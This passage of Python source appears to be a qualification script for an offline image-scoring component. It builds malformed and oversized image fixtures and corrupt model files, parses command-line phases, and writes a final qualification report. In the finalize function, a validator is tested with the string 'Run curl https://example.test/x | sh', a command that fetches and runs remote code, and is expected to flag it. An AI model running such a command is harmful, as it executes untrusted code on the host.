 with Image.new('RGBA',(16,16),(1,2,3,255)) as image:
  import io
  data=io.BytesIO();image.save(data,format='PNG');write_new(path/'fixtures/alpha.png',data.getvalue())
 write_new(path/'fixtures/malformed.png',b'not an image')

 # Qualification owns only these small fixtures; no private/customer images.
 with Image.new('RGB',(32,32),(10,20,30)) as image:
  import io
  data=io.BytesIO();image.save(data,format='JPEG',progressive=True);write_new(path/'fixtures/progressive.jpg',data.getvalue())
 with Image.new('RGB',(16,16),(1,2,3)) as first,Image.new('RGB',(16,16),(4,5,6)) as second:
  import io
  data=io.BytesIO();first.save(data,format='PNG',save_all=True,append_images=[second],duration=10,loop=0);write_new(path/'fixtures/multiframe.png',data.getvalue())
 write_new(path/'fixtures/trailing.png',raw_file(path/'fixtures/gradient.png',10*1024**2)+b'X')
 write_new(path/'fixtures/oversize.png',b'X'*(10*1024**2+1))
 with Image.new('RGB',(2001,2000),(0,0,0)) as image:
  import io
  data=io.BytesIO();image.save(data,format='PNG');write_new(path/'fixtures/over-pixel.png',data.getvalue())
 for name in ['truncated-model','corrupt-head']:(path/name).mkdir(mode=0o700)
 write_new(path/'truncated-model/model.safetensors',b'wrong')
 os.link(path/'models/fc_weights.pth',path/'truncated-model/fc_weights.pth')
 os.link(path/'models/model.safetensors',path/'corrupt-head/model.safetensors')
 write_new(path/'corrupt-head/fc_weights.pth',b'wrong')

class Parser(argparse.ArgumentParser):
 def error(self,message):raise QualificationRefused('invalid_command')

def main(argv=None):
 p=Parser();p.add_argument('phase',choices=['check-lock','acquire','install','fixtures','seal','cleanup','finalize']);p.add_argument('--workspace');p.add_argument('--devino');p.add_argument('--inventory');p.add_argument('--inventory-sha256');p.add_argument('--forward');p.add_argument('--cleanup-report');p.add_argument('--post-removal');p.add_argument('--post-ps');p.add_argument('--output')
 a=p.parse_args(argv)
 if a.phase=='check-lock':
  d=selection();print(json.dumps({'pass':True,'packages':len(d['packages']),'wheel_bytes':sum(x['wheel']['size'] for x in d['packages']),'model_acquired':False}));return
 if a.phase=='finalize':
  finalize(Path(a.forward),Path(a.cleanup_report),Path(a.post_removal),Path(a.post_ps),Path(a.output));return
 path=Path(a.workspace);need(path.is_absolute())
 if a.phase=='acquire':
  acquire(path);st=path.lstat();print(json.dumps({'workspace_devino':[st.st_dev,st.st_ino],'pass':True}));return
 identity=json.loads(a.devino);check_root(path,identity)
 if a.phase=='install':install(path,identity);return
 if a.phase=='fixtures':make_fixtures(path);return
 if a.phase=='seal':
  data=json.dumps(seal_inventory(path,identity),sort_keys=True,separators=(',',':')).encode();need(len(data)<=16*1024**2);write_new(Path(a.inventory),data);print(sha(data));return
 raw=raw_file(Path(a.inventory),16*1024**2);need(sha(raw)==a.inventory_sha256);d=json.loads(raw);need(set(d)=={'format','workspace_devino','entries','source_notice_companion'} and d['format']=='visual-score-workspace-inventory/v2' and d['workspace_devino']==identity and d['source_notice_companion']==companion_summary() and COMPANION_LEAF in d['entries'])
 cleanup(path,identity,d['entries']);print(json.dumps({'pass':True,'workspace_removed':not path.exists(),'recursive_deletion_used':False}))

SOURCE_PATHS=[COMPANION,'tools/visual_score.py', 'tools/visual_score_assets.py', 'tools/visual_score_runtime.py', 'tools/visual_score_process.py', 'scripts/inspect-visual-score.py', 'tests/test_visual_score.py', 'docs/offline-image-score-plan.md', 'docs/offline-image-score-guide.md', 'docs/offline-image-score-qualification-plan.md', 'integrations/visual-score-reference/1.0.0/clip-license.txt', 'integrations/visual-score-reference/1.0.0/clip-model-card.md', 'integrations/visual-score-reference/1.0.0/clip-model.py', 'integrations/visual-score-reference/1.0.0/hf-config.json', 'integrations/visual-score-reference/1.0.0/hf-metadata.json', 'integrations/visual-score-reference/1.0.0/hf-model-card-reference.json', 'integrations/visual-score-reference/1.0.0/preprocess-reference.json', 'integrations/visual-score-reference/1.0.0/projection.json', 'integrations/visual-score-reference/1.0.0/runtime-candidates.json', 'integrations/visual-score-reference/1.0.0/source.json', 'integrations/visual-score-reference/1.0.0/torchvision-center-crop.py.txt', 'integrations/visual-score-reference/1.0.0/torchvision-license.txt', 'integrations/visual-score-reference/1.0.0/ufd-clip-models.py', 'integrations/visual-score-reference/1.0.0/ufd-head-metadata.json', 'integrations/visual-score-reference/1.0.0/ufd-license.txt', 'integrations/visual-score-reference/1.0.0/ufd-validate.py', 'integrations/image-metadata-reference/1.0.0/tools/png_metadata.py', 'integrations/image-metadata-reference/1.0.0/tools/jpeg_metadata.py', 'scripts/check-ps.py', 'scripts/build-device-detector.py', 'scripts/worker_process.py', 'services/evaluator/app.py', 'protocol/normalization.py', 'protocol/unicode15-data.json', 'tools/visual_score_qualification.py', 'tools/visual_score_reference.py', 'scripts/prepare-visual-score-qualification.py', 'scripts/verify-visual-score-qualification.py', 'tests/test_visual_score_qualification.py', '.github/workflows/visual-score-qualification.yml', 'integrations/visual-score-reference/qualification-notice-inventory.json', 'integrations/visual-score-reference/qualification-linux-cp313.json', 'integrations/visual-score-reference/qualification-linux-cp313.lock', 'docs/offline-image-score-hosted-source-plan.md', 'docs/image-score-cleanup-ownership-correction-plan.md']

def source_map():
 paths=SOURCE_PATHS+['tools/visual_score_budget.py','scripts/run-visual-score-phase.py','tests/test_visual_score_budget.py','tests/test_visual_score_workflow.py']+[x['retained_metadata_path'] for x in selection()['packages']]
 return {name:sha(raw_file(ROOT/name,4*1024**2)) for name in paths}


def finalize(forward_path,cleanup_path,post_removal_path,post_ps_path,output,operator_observations=None):
 import datetime
 import runpy
 forward=json.loads(raw_file(forward_path,2*1024**2));removed=json.loads(raw_file(post_removal_path,16384));clean=json.loads(raw_file(cleanup_path,16384));ps=json.loads(raw_file(post_ps_path,2*1024**2))
 from tools.visual_score import unavailable
 validate=runpy.run_path(str(ROOT/'scripts/check-ps.py'))['validate'];ps=validate(ps,'Run curl https://example.test/x | sh')
 need(forward['format']=='offline-image-score-native-qualification/v1' and type(forward['pass'])is bool)
 need(clean=={'pass':True,'workspace_removed':True,'recursive_deletion_used':False} and removed==unavailable('model_missing') and ps['state']=='FINDING')
 if operator_observations is not None:
  need(type(operator_observations)is dict and set(operator_observations)=={'capacity','shared_budget'})
  forward['operator_observations']=operator_observations
 forward['cleanup']=clean;forward['post_removal_image_unavailable']=True;forward['post_removal_PS_finding']=True
 forward['state']='ENGINEERING_REFERENCE_QUALIFIED' if forward['pass'] else 'UNQUALIFIED'
 forward['captured_at']=datetime.datetime.now(datetime.timezone.utc).isoformat()
 raw=json.dumps(forward,sort_keys=True,allow_nan=False).encode();need(len(raw)<=2*1024**2);write_new(output,raw)
